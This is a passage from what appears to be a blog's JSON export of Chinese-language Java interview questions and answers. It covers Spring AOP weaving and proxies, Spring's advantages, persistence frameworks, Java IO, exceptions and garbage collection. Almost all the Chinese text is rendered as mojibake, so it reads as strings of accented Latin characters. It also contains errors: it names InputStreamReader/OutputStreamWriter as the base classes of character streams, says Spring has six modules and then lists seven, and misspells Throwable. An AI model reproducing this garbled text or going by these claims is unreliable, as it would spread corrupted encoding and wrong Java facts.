·ï¼Œå³ä½¿ä¸€ä¸ªä¸šåŠ¡ç±»åŸæœ¬æ²¡æœ‰å®ç°æŸä¸ªæ¥å£ï¼Œé€šè¿‡å¼•ä»‹åŠŸèƒ½ï¼Œå¯ä»¥åŠ¨æ€çš„æœªè¯¥ä¸šåŠ¡ç±»æ·»åŠ æ¥å£çš„å®ç°é€»è¾‘ï¼Œè®©ä¸šåŠ¡ç±»æˆä¸ºè¿™ä¸ªæ¥å£çš„å®ç°ç±»ã€‚e. ç»‡å…¥ï¼ˆWeavingï¼‰ï¼šç»‡å…¥æ˜¯å°†å¢å¼ºæ·»åŠ åˆ°ç›®æ ‡ç±»å…·ä½“è¿æ¥ç‚¹ä¸Šçš„è¿‡ç¨‹ï¼ŒAOPæœ‰ä¸‰ç§ç»‡å…¥æ–¹å¼ï¼šâ‘ ç¼–è¯‘æœŸç»‡å…¥ï¼šéœ€è¦ç‰¹æ®Šçš„Javaç¼–è¯‘æœŸï¼ˆä¾‹å¦‚AspectJçš„ajcï¼‰ï¼›â‘¡è£…è½½æœŸç»‡å…¥ï¼šè¦æ±‚ä½¿ç”¨ç‰¹æ®Šçš„ç±»åŠ è½½å™¨ï¼Œåœ¨è£…è½½ç±»çš„æ—¶å€™å¯¹ç±»è¿›è¡Œå¢å¼ºï¼›â‘¢è¿è¡Œæ—¶ç»‡å…¥ï¼šåœ¨è¿è¡Œæ—¶ä¸ºç›®æ ‡ç±»ç”Ÿæˆä»£ç†å®ç°å¢å¼ºã€‚Springé‡‡ç”¨äº†åŠ¨æ€ä»£ç†çš„æ–¹å¼å®ç°äº†è¿è¡Œæ—¶ç»‡å…¥ï¼Œè€ŒAspectJé‡‡ç”¨äº†ç¼–è¯‘æœŸç»‡å…¥å’Œè£…è½½æœŸç»‡å…¥çš„æ–¹å¼ã€‚f. åˆ‡é¢ï¼ˆAspectï¼‰ï¼šåˆ‡é¢æ˜¯ç”±åˆ‡ç‚¹å’Œå¢å¼ºï¼ˆå¼•ä»‹ï¼‰ç»„æˆçš„ï¼Œå®ƒåŒ…æ‹¬äº†å¯¹æ¨ªåˆ‡å…³æ³¨åŠŸèƒ½çš„å®šä¹‰ï¼Œä¹ŸåŒ…æ‹¬äº†å¯¹è¿æ¥ç‚¹çš„å®šä¹‰ã€‚ AOPçš„åŸç†æ˜¯ä»€ä¹ˆï¼ŸAOPï¼ˆAspect Orient Programmingï¼‰ï¼ŒæŒ‡é¢å‘æ–¹é¢ï¼ˆåˆ‡é¢ï¼‰ç¼–ç¨‹ï¼Œä½œä¸ºé¢å‘å¯¹è±¡çš„ä¸€ç§è¡¥å……ï¼Œç”¨äºå¤„ç†ç³»ç»Ÿä¸­åˆ†å¸ƒäºå„ä¸ªæ¨¡å—çš„æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼Œæ¯”å¦‚äº‹åŠ¡ç®¡ç†ã€æ—¥å¿—ã€ç¼“å­˜ç­‰ç­‰ã€‚AOPå®ç°çš„å…³é”®åœ¨äºAOPæ¡†æ¶è‡ªåŠ¨åˆ›å»ºçš„AOPä»£ç†ï¼ŒAOPä»£ç†ä¸»è¦åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ï¼Œé™æ€ä»£ç†çš„ä»£è¡¨ä¸ºAspectJï¼›è€ŒåŠ¨æ€ä»£ç†åˆ™ä»¥Spring AOPä¸ºä»£è¡¨ã€‚é€šå¸¸ä½¿ç”¨AspectJçš„ç¼–è¯‘æ—¶å¢å¼ºå®ç°AOPï¼ŒAspectJæ˜¯é™æ€ä»£ç†çš„å¢å¼ºï¼Œæ‰€è°“çš„é™æ€ä»£ç†å°±æ˜¯AOPæ¡†æ¶ä¼šåœ¨ç¼–è¯‘é˜¶æ®µç”ŸæˆAOPä»£ç†ç±»ï¼Œå› æ­¤ä¹Ÿç§°ä¸ºç¼–è¯‘æ—¶å¢å¼ºã€‚ Spring AOPä¸­çš„åŠ¨æ€ä»£ç†ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼ŒJDKåŠ¨æ€ä»£ç†å’ŒCGLIBåŠ¨æ€ä»£ç†ã€‚JDKåŠ¨æ€ä»£ç†é€šè¿‡åå°„æ¥æ¥æ”¶è¢«ä»£ç†çš„ç±»ï¼Œå¹¶ä¸”è¦æ±‚è¢«ä»£ç†çš„ç±»å¿…é¡»å®ç°ä¸€ä¸ªæ¥å£ã€‚JDKåŠ¨æ€ä»£ç†çš„æ ¸å¿ƒæ˜¯InvocationHandleræ¥å£å’ŒProxyç±»ã€‚ å¦‚æœç›®æ ‡ç±»æ²¡æœ‰å®ç°æ¥å£ï¼Œé‚£ä¹ˆSpring AOPä¼šé€‰æ‹©ä½¿ç”¨CGLIBæ¥åŠ¨æ€ä»£ç†ç›®æ ‡ç±»ã€‚CGLIBï¼ˆCode Generation Libraryï¼‰ï¼Œæ˜¯ä¸€ä¸ªä»£ç ç”Ÿæˆçš„ç±»åº“ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€çš„ç”ŸæˆæŸä¸ªç±»çš„å­ç±»ï¼Œæ³¨æ„ï¼ŒCGLIBæ˜¯é€šè¿‡ç»§æ‰¿çš„æ–¹å¼åšçš„åŠ¨æ€ä»£ç†ï¼Œå› æ­¤å¦‚æœæŸä¸ªç±»è¢«æ ‡è®°ä¸ºfinalï¼Œé‚£ä¹ˆå®ƒæ˜¯æ— æ³•ä½¿ç”¨CGLIBåšåŠ¨æ€ä»£ç†çš„ã€‚ aopçš„åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼ŸAuthentication æƒé™ ï¼ŒCaching ç¼“å­˜ ï¼ŒContext passing å†…å®¹ä¼ é€’ ï¼ŒError handling é”™è¯¯å¤„ç† ï¼ŒLazy loading æ‡’åŠ è½½ ï¼ŒDebugging è°ƒè¯• ï¼Œlogging, tracing, profiling and monitoring è®°å½•è·Ÿè¸ª ä¼˜åŒ– æ ¡å‡†ï¼ŒPerformance optimization æ€§èƒ½ä¼˜åŒ– ï¼ŒPersistence æŒä¹…åŒ– ï¼ŒResource pooling èµ„æºæ±  ï¼ŒSynchronization åŒæ­¥ï¼ŒTransactions äº‹åŠ¡ã€‚ è¯´æ˜ä¸€ä¸‹Springæ¡†æ¶ä¸ºä¼ä¸šçº§å¼€å‘å¸¦æ¥çš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ- éä¾µå…¥å¼ï¼šæ”¯æŒåŸºäºPOJOçš„ç¼–ç¨‹æ¨¡å¼ï¼Œä¸å¼ºåˆ¶æ€§çš„è¦æ±‚å®ç°Springæ¡†æ¶ä¸­çš„æ¥å£æˆ–ç»§æ‰¿Springæ¡†æ¶ä¸­çš„ç±»ã€‚- IoCå®¹å™¨ï¼šIoCå®¹å™¨å¸®åŠ©åº”ç”¨ç¨‹åºç®¡ç†å¯¹è±¡ä»¥åŠå¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœå‘ç”Ÿäº†æ”¹å˜åªéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶è€Œä¸æ˜¯ä¿®æ”¹ä»£ç ï¼Œå› ä¸ºä»£ç çš„ä¿®æ”¹å¯èƒ½æ„å‘³ç€é¡¹ç›®çš„é‡æ–°æ„å»ºå’Œå®Œæ•´çš„å›å½’æµ‹è¯•ã€‚æœ‰äº†IoCå®¹å™¨ï¼Œç¨‹åºå‘˜å†ä¹Ÿä¸éœ€è¦è‡ªå·±ç¼–å†™å·¥å‚ã€å•ä¾‹ï¼Œè¿™ä¸€ç‚¹ç‰¹åˆ«ç¬¦åˆSpringçš„ç²¾ç¥â€ä¸è¦é‡å¤çš„å‘æ˜è½®å­â€ã€‚- AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰ï¼šå°†æ‰€æœ‰çš„æ¨ªåˆ‡å…³æ³¨åŠŸèƒ½å°è£…åˆ°åˆ‡é¢ï¼ˆaspectï¼‰ä¸­ï¼Œé€šè¿‡é…ç½®çš„æ–¹å¼å°†æ¨ªåˆ‡å…³æ³¨åŠŸèƒ½åŠ¨æ€æ·»åŠ åˆ°ç›®æ ‡ä»£ç ä¸Šï¼Œè¿›ä¸€æ­¥å®ç°äº†ä¸šåŠ¡é€»è¾‘å’Œç³»ç»ŸæœåŠ¡ä¹‹é—´çš„åˆ†ç¦»ã€‚å¦ä¸€æ–¹é¢ï¼Œæœ‰äº†AOPç¨‹åºå‘˜å¯ä»¥çœå»å¾ˆå¤šè‡ªå·±å†™ä»£ç†ç±»çš„å·¥ä½œã€‚- MVCï¼šSpringçš„MVCæ¡†æ¶ä¸ºWebè¡¨ç¤ºå±‚æä¾›äº†æ›´å¥½çš„è§£å†³æ–¹æ¡ˆã€‚- äº‹åŠ¡ç®¡ç†ï¼šSpringä»¥å®½å¹¿çš„èƒ¸æ€€æ¥çº³å¤šç§æŒä¹…å±‚æŠ€æœ¯ï¼Œå¹¶ä¸”ä¸ºå…¶æä¾›äº†å£°æ˜å¼çš„äº‹åŠ¡ç®¡ç†ï¼Œåœ¨ä¸éœ€è¦ä»»ä½•ä¸€è¡Œä»£ç çš„æƒ…å†µä¸‹å°±èƒ½å¤Ÿå®Œæˆäº‹åŠ¡ç®¡ç†ã€‚- å…¶ä»–ï¼šé€‰æ‹©Springæ¡†æ¶çš„åŸå› è¿˜è¿œä¸æ­¢äºæ­¤ï¼ŒSpringä¸ºJavaä¼ä¸šçº§å¼€å‘æä¾›äº†ä¸€ç«™å¼é€‰æ‹©ï¼Œä½ å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™ä½¿ç”¨å®ƒçš„éƒ¨åˆ†å’Œå…¨éƒ¨ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œç”šè‡³å¯ä»¥åœ¨æ„Ÿè§‰ä¸åˆ°Springå­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œåœ¨ä½ çš„é¡¹ç›®ä¸­ä½¿ç”¨Springæä¾›çš„å„ç§ä¼˜ç§€çš„åŠŸèƒ½ã€‚ è°ˆä¸€ä¸‹springæ¡†æ¶çš„ä¼˜ç‚¹éƒ½æœ‰å“ªäº›ï¼ŸSpringæ˜¯ä¸€ä¸ªè½»é‡çº§çš„DIå’ŒAOPå®¹å™¨æ¡†æ¶ï¼Œåœ¨é¡¹ç›®çš„ä¸­çš„ä½¿ç”¨è¶Šæ¥è¶Šå¹¿æ³›ï¼Œå®ƒçš„ä¼˜ç‚¹ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š Springæ˜¯ä¸€ä¸ªéä¾µå…¥å¼æ¡†æ¶ï¼Œå…¶ç›®æ ‡æ˜¯ä½¿åº”ç”¨ç¨‹åºä»£ç å¯¹æ¡†æ¶çš„ä¾èµ–æœ€å°åŒ–ï¼Œåº”ç”¨ä»£ç å¯ä»¥åœ¨æ²¡æœ‰Springæˆ–è€…å…¶ä»–å®¹å™¨çš„æƒ…å†µè¿è¡Œã€‚ Springæä¾›äº†ä¸€ä¸ªä¸€è‡´çš„ç¼–ç¨‹æ¨¡å‹ï¼Œä½¿åº”ç”¨ç›´æ¥ä½¿ç”¨POJOå¼€å‘ï¼Œä»è€Œå¯ä»¥ä½¿è¿è¡Œç¯å¢ƒéš”ç¦»å¼€æ¥ã€‚ Springæ¨åŠ¨åº”ç”¨çš„è®¾è®¡é£æ ¼å‘é¢å‘å¯¹è±¡åŠé¢å‘æ¥å£ç¼–ç¨‹è½¬å˜ï¼Œæé«˜äº†ä»£ç çš„é‡ç”¨æ€§å’Œå¯æµ‹è¯•æ€§ã€‚ Springæ”¹è¿›äº†ç»“æ„ä½“ç³»çš„é€‰æ‹©ï¼Œè™½ç„¶ä½œä¸ºåº”ç”¨å¹³å°ï¼ŒSpringå¯ä»¥å¸®åŠ©æˆ‘ä»¬é€‰æ‹©ä¸åŒçš„æŠ€æœ¯å®ç°ï¼Œæ¯”å¦‚ä»Hibernateåˆ‡æ¢åˆ°å…¶ä»–çš„ORMå·¥å…·ï¼Œä»Strutsåˆ‡æ¢åˆ°Spring MVC,å°½ç®¡æˆ‘ä»¬é€šå¸¸ä¸ä¼šè¿™ä¹ˆåšï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨æŠ€æœ¯æ–¹æ¡ˆä¸Šé€‰æ‹©ä½¿ç”¨Springä½œä¸ºåº”ç”¨å¹³å°ï¼ŒSpringè‡³å°‘ä¸ºæˆ‘ä»¬æä¾›äº†è¿™ç§å¯èƒ½æ€§çš„é€‰æ‹©ï¼Œä»è€Œé™ä½äº†å¹³å°é”å®šé£é™©ã€‚ Strutsæ‹¦æˆªå™¨å’ŒSpring AOPæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿæ‹¦æˆªå™¨æ˜¯AOPçš„ä¸€ç§å®ç°ï¼Œstruts2 æ‹¦æˆªå™¨é‡‡ç”¨xwork2çš„interceptorï¼è€Œspringçš„AOPåŸºäºIoCåŸºç¡€,å…¶åº•å±‚é‡‡ç”¨åŠ¨æ€ä»£ç†ä¸CGLIBä»£ç†ä¸¤ç§æ–¹å¼ç»“åˆçš„å®ç°æ–¹å¼ã€‚ ç®€å•ä»‹ç»ä¸€ä¸‹springï¼ŸSpringæ˜¯ä¸€ä¸ªè½»é‡çº§æ¡†æ¶ï¼Œå¯ä»¥ä¸€ç«™å¼æ„å»ºä½ çš„ä¼ä¸šçº§åº”ç”¨ã€‚ Springçš„æ¨¡å—å¤§æ¦‚åˆ†ä¸º6ä¸ªã€‚åˆ†åˆ«æ˜¯ï¼š 1ã€Core Containerï¼ˆSpringçš„æ ¸å¿ƒï¼‰ã€é‡è¦ã€‘ 2ã€AOPï¼ˆé¢å‘åˆ‡é¢å˜æˆï¼‰ã€é‡è¦ã€‘ 3ã€Messagingï¼ˆæ¶ˆæ¯å‘é€çš„æ”¯æŒï¼‰ 4ã€Data Access/Integrationï¼ˆæ•°æ®è®¿é—®å’Œé›†æˆï¼‰ 5ã€Webï¼ˆä¸»è¦æ˜¯SpringWebå†…å®¹ï¼ŒåŒ…æ‹¬MVCï¼‰ã€é‡è¦ã€‘ 6ã€Testï¼ˆSpringæµ‹è¯•æ”¯æŒï¼ŒåŒ…å«JUintç­‰æµ‹è¯•å•å…ƒçš„æ”¯æŒï¼‰ 7ã€Instrumentationï¼ˆè®¾å¤‡æ”¯æŒï¼Œæ¯”å¦‚Tomcatçš„æ”¯æŒï¼‰ è¯·é—®æŒä¹…å±‚è®¾è®¡è¦è€ƒè™‘çš„é—®é¢˜æœ‰å“ªäº›ï¼Ÿè¯·è°ˆä¸€ä¸‹ä½ ç”¨è¿‡çš„æŒä¹…å±‚æ¡†æ¶éƒ½æœ‰å“ªäº›ï¼Ÿæ‰€è°“â€æŒä¹…â€å°±æ˜¯å°†æ•°æ®ä¿å­˜åˆ°å¯æ‰ç”µå¼å­˜å‚¨è®¾å¤‡ä¸­ä»¥ä¾¿ä»Šåä½¿ç”¨ï¼Œç®€å•çš„è¯´ï¼Œå°±æ˜¯å°†å†…å­˜ä¸­çš„æ•°æ®ä¿å­˜åˆ°å…³ç³»å‹æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰æä¾›æŒä¹…åŒ–æ”¯æŒçš„è®¾å¤‡ä¸­ã€‚æŒä¹…å±‚å°±æ˜¯ç³»ç»Ÿä¸­ä¸“æ³¨äºå®ç°æ•°æ®æŒä¹…åŒ–çš„ç›¸å¯¹ç‹¬ç«‹çš„å±‚é¢ã€‚ æŒä¹…å±‚è®¾è®¡çš„ç›®æ ‡åŒ…æ‹¬ï¼š- æ•°æ®å­˜å‚¨é€»è¾‘çš„åˆ†ç¦»ï¼Œæä¾›æŠ½è±¡åŒ–çš„æ•°æ®è®¿é—®æ¥å£ã€‚- æ•°æ®è®¿é—®åº•å±‚å®ç°çš„åˆ†ç¦»ï¼Œå¯ä»¥åœ¨ä¸ä¿®æ”¹ä»£ç çš„æƒ…å†µä¸‹åˆ‡æ¢åº•å±‚å®ç°ã€‚- èµ„æºç®¡ç†å’Œè°ƒåº¦çš„åˆ†ç¦»ï¼Œåœ¨æ•°æ®è®¿é—®å±‚å®ç°ç»Ÿä¸€çš„èµ„æºè°ƒåº¦ï¼ˆå¦‚ç¼“å­˜æœºåˆ¶ï¼‰ã€‚- æ•°æ®æŠ½è±¡ï¼Œæä¾›æ›´é¢å‘å¯¹è±¡çš„æ•°æ®æ“ä½œã€‚ æŒä¹…å±‚æ¡†æ¶æœ‰ï¼š- Hibernate- MyBatis- TopLink- Guzz- jOOQ- Spring Data- ActiveJDBC","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"IO","slug":"IO","date":"2020-07-13T21:39:13.000Z","updated":"2021-04-25T13:53:05.309Z","comments":true,"path":"IO/","link":"","permalink":"https://blog.kayleh.top/IO/","excerpt":"IO","text":"IO è¿è¡Œæ—¶å¼‚å¸¸ä¸å—æ£€å¼‚å¸¸æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¼‚å¸¸è¡¨ç¤ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„éæ­£å¸¸çŠ¶æ€ï¼Œè¿è¡Œæ—¶å¼‚å¸¸è¡¨ç¤ºè™šæ‹Ÿæœºçš„é€šå¸¸æ“ä½œä¸­å¯èƒ½é‡åˆ°çš„å¼‚å¸¸ï¼Œæ˜¯ä¸€ç§å¸¸è§è¿è¡Œé”™è¯¯ï¼Œåªè¦ç¨‹åºè®¾è®¡å¾—æ²¡æœ‰é—®é¢˜é€šå¸¸å°±ä¸ä¼šå‘ç”Ÿã€‚å—æ£€å¼‚å¸¸è·Ÿç¨‹åºè¿è¡Œçš„ä¸Šä¸‹æ–‡ç¯å¢ƒæœ‰å…³ï¼Œå³ä½¿ç¨‹åºè®¾è®¡æ— è¯¯ï¼Œä»ç„¶å¯èƒ½å› ä½¿ç”¨çš„é—®é¢˜è€Œå¼•å‘ã€‚Javaç¼–è¯‘å™¨è¦æ±‚æ–¹æ³•å¿…é¡»å£°æ˜æŠ›å‡ºå¯èƒ½å‘ç”Ÿçš„å—æ£€å¼‚å¸¸ï¼Œä½†æ˜¯å¹¶ä¸è¦æ±‚å¿…é¡»å£°æ˜æŠ›å‡ºæœªè¢«æ•è·çš„è¿è¡Œæ—¶å¼‚å¸¸ã€‚å¼‚å¸¸å’Œç»§æ‰¿ä¸€æ ·ï¼Œæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­ç»å¸¸è¢«æ»¥ç”¨çš„ä¸œè¥¿ï¼Œåœ¨Effective Javaä¸­å¯¹å¼‚å¸¸çš„ä½¿ç”¨ç»™å‡ºäº†ä»¥ä¸‹æŒ‡å¯¼åŸåˆ™ï¼š - ä¸è¦å°†å¼‚å¸¸å¤„ç†ç”¨äºæ­£å¸¸çš„æ§åˆ¶æµï¼ˆè®¾è®¡è‰¯å¥½çš„APIä¸åº”è¯¥å¼ºè¿«å®ƒçš„è°ƒç”¨è€…ä¸ºäº†æ­£å¸¸çš„æ§åˆ¶æµè€Œä½¿ç”¨å¼‚å¸¸ï¼‰- å¯¹å¯ä»¥æ¢å¤çš„æƒ…å†µä½¿ç”¨å—æ£€å¼‚å¸¸ï¼Œå¯¹ç¼–ç¨‹é”™è¯¯ä½¿ç”¨è¿è¡Œæ—¶å¼‚å¸¸- é¿å…ä¸å¿…è¦çš„ä½¿ç”¨å—æ£€å¼‚å¸¸ï¼ˆå¯ä»¥é€šè¿‡ä¸€äº›çŠ¶æ€æ£€æµ‹æ‰‹æ®µæ¥é¿å…å¼‚å¸¸çš„å‘ç”Ÿï¼‰- ä¼˜å…ˆä½¿ç”¨æ ‡å‡†çš„å¼‚å¸¸- æ¯ä¸ªæ–¹æ³•æŠ›å‡ºçš„å¼‚å¸¸éƒ½è¦æœ‰æ–‡æ¡£- ä¿æŒå¼‚å¸¸çš„åŸå­æ€§- ä¸è¦åœ¨catchä¸­å¿½ç•¥æ‰æ•è·åˆ°çš„å¼‚å¸¸ ä»€ä¹ˆæ˜¯javaåºåˆ—åŒ–ï¼Ÿä»¥åŠå¦‚ä½•å®ç°javaåºåˆ—åŒ–ï¼Ÿåºåˆ—åŒ–å°±æ˜¯ä¸€ç§ç”¨æ¥å¤„ç†å¯¹è±¡æµçš„æœºåˆ¶ï¼Œæ‰€è°“å¯¹è±¡æµä¹Ÿå°±æ˜¯å°†å¯¹è±¡çš„å†…å®¹è¿›è¡ŒæµåŒ–ã€‚å¯ä»¥å¯¹æµåŒ–åçš„å¯¹è±¡è¿›è¡Œè¯»å†™æ“ä½œï¼Œä¹Ÿå¯å°†æµåŒ–åçš„å¯¹è±¡ä¼ è¾“äºç½‘ç»œä¹‹é—´ã€‚åºåˆ—åŒ–æ˜¯ä¸ºäº†è§£å†³åœ¨å¯¹å¯¹è±¡æµè¿›è¡Œè¯»å†™æ“ä½œæ—¶æ‰€å¼•å‘çš„é—®é¢˜ã€‚åºåˆ—åŒ–çš„å®ç°ï¼šå°†éœ€è¦è¢«åºåˆ—åŒ–çš„ç±»å®ç°Serializableæ¥å£ï¼Œè¯¥æ¥å£æ²¡æœ‰éœ€è¦å®ç°çš„æ–¹æ³•ï¼Œimplements Serializableåªæ˜¯ä¸ºäº†æ ‡æ³¨è¯¥å¯¹è±¡æ˜¯å¯è¢«åºåˆ—åŒ–çš„ï¼Œç„¶åä½¿ç”¨ä¸€ä¸ªè¾“å‡ºæµ(å¦‚ï¼šFileOutputStream)æ¥æ„é€ ä¸€ä¸ª ObjectOutputStream(å¯¹è±¡æµ)å¯¹è±¡ï¼Œæ¥ç€ï¼Œä½¿ç”¨ObjectOutputStreamå¯¹è±¡çš„writeObject(Object obj)æ–¹æ³•å°±å¯ä»¥å°†å‚æ•°ä¸ºobjçš„å¯¹è±¡å†™å‡º(å³ä¿å­˜å…¶çŠ¶æ€)ï¼Œè¦æ¢å¤çš„è¯åˆ™ç”¨è¾“å…¥æµã€‚ javaä¸­æœ‰å‡ ç§ç±»å‹çš„æµï¼ŸJDKä¸ºæ¯ç§ç±»å‹çš„æµæä¾›äº†ä¸€äº›æŠ½è±¡ç±»ä»¥ä¾›ç»§æ‰¿ï¼Œè¯·è¯´å‡ºä»–ä»¬åˆ†åˆ«æ˜¯å“ªäº›ç±»ï¼Ÿå­—èŠ‚æµï¼Œå­—ç¬¦æµã€‚å­—èŠ‚æµç»§æ‰¿äºInputStream OutputStreamï¼Œå­—ç¬¦æµç»§æ‰¿äºInputStreamReader OutputStreamWriterã€‚åœ¨java.ioåŒ…ä¸­è¿˜æœ‰è®¸å¤šå…¶ä»–çš„æµï¼Œä¸»è¦æ˜¯ä¸ºäº†æé«˜æ€§èƒ½å’Œä½¿ç”¨æ–¹ä¾¿ã€‚ è¯´æ˜ä¸€ä¸‹Javaä¸­çš„å¼‚å¸¸å¤„ç†æœºåˆ¶çš„åŸç†ä»¥åŠå¦‚ä½•åº”ç”¨ã€‚å½“JAVA ç¨‹åºè¿åäº†JAVAçš„è¯­ä¹‰è§„åˆ™æ—¶ï¼ŒJAVAè™šæ‹Ÿæœºå°±ä¼šå°†å‘ç”Ÿçš„é”™è¯¯è¡¨ç¤ºä¸ºä¸€ä¸ªå¼‚å¸¸ã€‚è¿åè¯­ä¹‰è§„åˆ™åŒ…æ‹¬2ç§æƒ…å†µã€‚ä¸€ç§æ˜¯JAVAç±»åº“å†…ç½®çš„è¯­ä¹‰æ£€æŸ¥ã€‚ä¾‹å¦‚æ•°ç»„ä¸‹æ ‡è¶Šç•Œ,ä¼šå¼•å‘IndexOutOfBoundsException;è®¿é—®nullçš„å¯¹è±¡æ—¶ä¼šå¼•å‘NullPointerExceptionã€‚å¦ä¸€ç§æƒ…å†µå°±æ˜¯JAVAå…è®¸ç¨‹åºå‘˜æ‰©å±•è¿™ç§è¯­ä¹‰æ£€æŸ¥ï¼Œç¨‹åºå‘˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„å¼‚å¸¸ï¼Œå¹¶è‡ªç”±é€‰æ‹©åœ¨ä½•æ—¶ç”¨throwå…³é”®å­—å¼•å‘å¼‚å¸¸ã€‚æ‰€æœ‰çš„å¼‚å¸¸éƒ½æ˜¯ java.lang.Thowableçš„å­ç±»ã€‚ è¯·é—®ä½ å¹³æ—¶æœ€å¸¸è§åˆ°çš„runtime exceptionæ˜¯ä»€ä¹ˆï¼ŸArithmeticException, ArrayStoreException, BufferOverflowException, BufferUnderflowException, CannotRedoException, CannotUndoException, ClassCastException, CMMException, ConcurrentModificationException, DOMException, EmptyStackException, IllegalArgumentException, IllegalMonitorStateException, IllegalPathStateException, IllegalStateException, ImagingOpException, IndexOutOfBoundsException, MissingResourceException, NegativeArraySizeException, NoSuchElementException, NullPointerException, ProfileDataException, ProviderException, RasterFormatException, SecurityException, SystemException, UndeclaredThrowableException, UnmodifiableSetException, UnsupportedOperationException errorå’Œexceptionæœ‰ä»€ä¹ˆåŒºåˆ«?error è¡¨ç¤ºæ¢å¤ä¸æ˜¯ä¸å¯èƒ½ä½†å¾ˆå›°éš¾çš„æƒ…å†µä¸‹çš„ä¸€ç§ä¸¥é‡é—®é¢˜ã€‚æ¯”å¦‚è¯´å†…å­˜æº¢å‡ºã€‚ä¸å¯èƒ½æŒ‡æœ›ç¨‹åºèƒ½å¤„ç†è¿™æ ·çš„æƒ…å†µã€‚exception è¡¨ç¤ºä¸€ç§è®¾è®¡æˆ–å®ç°é—®é¢˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒè¡¨ç¤ºå¦‚æœç¨‹åºè¿è¡Œæ­£å¸¸ï¼Œä»ä¸ä¼šå‘ç”Ÿçš„æƒ…å†µã€‚ è¿è¡Œæ—¶çš„å¼‚å¸¸ä¸ä¸€èˆ¬æƒ…å†µä¸‹å‡ºç°çš„å¼‚å¸¸æœ‰ä»€ä¹ˆç›¸åŒç‚¹å’Œä¸åŒç‚¹ï¼Ÿå¼‚å¸¸è¡¨ç¤ºç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„éæ­£å¸¸çŠ¶æ€ï¼Œè¿è¡Œæ—¶å¼‚å¸¸è¡¨ç¤ºè™šæ‹Ÿæœºçš„é€šå¸¸æ“ä½œä¸­å¯èƒ½é‡åˆ°çš„å¼‚å¸¸ï¼Œæ˜¯ä¸€ç§å¸¸è§è¿è¡Œé”™è¯¯ã€‚javaç¼–è¯‘å™¨è¦æ±‚æ–¹æ³•å¿…é¡»å£°æ˜æŠ›å‡ºå¯èƒ½å‘ç”Ÿçš„éè¿è¡Œæ—¶å¼‚å¸¸ï¼Œä½†æ˜¯å¹¶ä¸è¦æ±‚å¿…é¡»å£°æ˜æŠ›å‡ºæœªè¢«æ•è·çš„è¿è¡Œæ—¶å¼‚å¸¸ã€‚ å¦‚ä½•æ‰“å°æ—¥å¿—ï¼Ÿcat /var/log/*.log å¦‚æœæ—¥å¿—åœ¨æ›´æ–°ï¼Œå¦‚ä½•å®æ—¶æŸ¥çœ‹tail -f /var/log/messages è¿˜å¯ä»¥ä½¿ç”¨watch -d -n 1 cat /var/log/messages -dè¡¨ç¤ºé«˜äº®ä¸åŒçš„åœ°æ–¹ï¼Œ-nè¡¨ç¤ºå¤šå°‘ç§’åˆ·æ–°ä¸€æ¬¡ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"GC","slug":"GC","date":"2020-07-13T21:38:14.000Z","updated":"2021-04-11T17:11:28.129Z","comments":true,"path":"GC/","link":"","permalink":"https://blog.kayleh.top/GC/","excerpt":"GC","text":"GC ç®€å•æè¿°ä¸€ä¸‹åƒåœ¾å›æ”¶å™¨çš„åŸºæœ¬åŸç†æ˜¯ä»€ä¹ˆï¼Ÿè¿˜æœ‰åƒåœ¾å›æ”¶å™¨å¯ä»¥é©¬ä¸Šå›æ”¶å†…å­˜å—ï¼Ÿå¹¶ä¸”æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥ä¸»åŠ¨é€šçŸ¥è™šæ‹Ÿæœºè¿›è¡Œåƒåœ¾å›æ”¶å‘¢ï¼Ÿ å¯¹äºGCæ¥è¯´ï¼Œå½“ç¨‹åºå‘˜åˆ›å»ºå¯¹è±¡æ—¶ï¼ŒGCå°±å¼€å§‹ç›‘æ§è¿™ä¸ªå¯¹è±¡çš„åœ°å€ã€å¤§å°ä»¥åŠä½¿ç”¨æƒ…å†µã€‚é€šå¸¸ï¼ŒGCé‡‡ç”¨æœ‰å‘å›¾çš„æ–¹å¼è®°å½•å’Œç®¡ç†å 